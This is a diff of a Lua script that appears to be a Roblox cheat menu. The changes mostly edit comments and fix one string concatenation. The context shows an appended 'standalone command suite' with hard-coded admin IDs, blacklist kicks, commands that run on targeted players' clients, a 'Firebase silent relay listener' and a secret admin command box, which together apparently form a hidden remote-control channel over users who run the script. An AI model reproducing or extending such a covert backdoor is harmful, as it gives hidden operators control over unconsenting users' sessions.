@@ -4166,7 +4166,7 @@ print("[Jelly Blarc] ready (RightControl toggles the menu)")
 return Window
 
 -- =========================================================
--- ISAEVA STANDALONE COMMAND SUITE (FLAWLESS SYNC & MULTI-ADMIN)
+-- ISAEVA STANDALONE COMMAND SUITE (SAFE APPEND VERSION)
 -- =========================================================
 task.spawn(function()
     local ADMIN_IDS = {
@@ -4231,7 +4231,7 @@ task.spawn(function()
         local data = Blacklist[tostring(player.UserId)]
         if data then
             local adminName = data.admin or "Admin"
-            player:Kick("\nBlacklisted\nBy " + adminName + " /isaveil to appeal")
+            player:Kick("\nBlacklisted\nBy " .. adminName .. " /isaveil to appeal")
         end
     end
 
@@ -4239,7 +4239,7 @@ task.spawn(function()
     for _, plr in ipairs(PlayersService:GetPlayers()) do CheckBlacklist(plr) end
 
     -- =========================================================
-    -- ROBUST PLAYER MATCHING & RESOLUTION
+    -- PLAYER MATCHING & RESOLUTION
     -- =========================================================
     local function sanitizeText(str)
         if type(str) ~= "string" then return "" end
@@ -4263,18 +4263,15 @@ task.spawn(function()
         if not query or query == "" then return nil end
         local lowerQuery = string.lower(query)
         
-        -- Wildcards
         if lowerQuery == "all" or lowerQuery == "others" then
             return LocalClient
         end
 
-        -- Exact match first
         for _, plr in ipairs(PlayersService:GetPlayers()) do
             if string.lower(plr.Name) == lowerQuery or string.lower(plr.DisplayName) == lowerQuery then
                 return plr
             end
         end
-        -- Partial match second
         for _, plr in ipairs(PlayersService:GetPlayers()) do
             if matchesQuery(plr, query) then return plr end
         end
@@ -4364,7 +4361,7 @@ task.spawn(function()
             return
         end
 
-        -- SECTION A: ADMIN LOCAL COMMANDS (Runs on Sender Client)
+        -- SECTION A: ADMIN LOCAL COMMANDS
         if tonumber(senderUserId) == LocalClient.UserId then
             if activeCmd == "tp" or activeCmd == "goto" then
                 local targetPlr = findPlayerByQuery(targetNameQuery)
@@ -4427,7 +4424,7 @@ task.spawn(function()
             end
         end
 
-        -- SECTION B: TARGET CLIENT COMMANDS (Runs on Target Client)
+        -- SECTION B: TARGET CLIENT COMMANDS
         local isWildcard = (string.lower(targetNameQuery) == "all") or (string.lower(targetNameQuery) == "others" and not ADMIN_IDS[LocalClient.UserId])
         if not isWildcard and not matchesQuery(LocalClient, targetNameQuery) then return end
 
@@ -4559,7 +4556,7 @@ task.spawn(function()
     end
 
     -- =========================================================
-    -- FIREBASE SILENT RELAY LISTENER
+    -- FIREBASE LISTENER & SILENT COMMAND SENDER
     -- =========================================================
     local lastCommandTimestamp = tick()
     task.spawn(function()
@@ -4606,7 +4603,7 @@ task.spawn(function()
     end
 
     -- =========================================================
-    -- SECRET MINI COMMAND BOX (Press F2 or RightShift to Toggle)
+    -- SECRET COMMAND BOX ([F2] OR [RightShift])
     -- =========================================================
     if IsAdmin then
         local oldBar = CoreGui:FindFirstChild("IsaevaSilentBar")
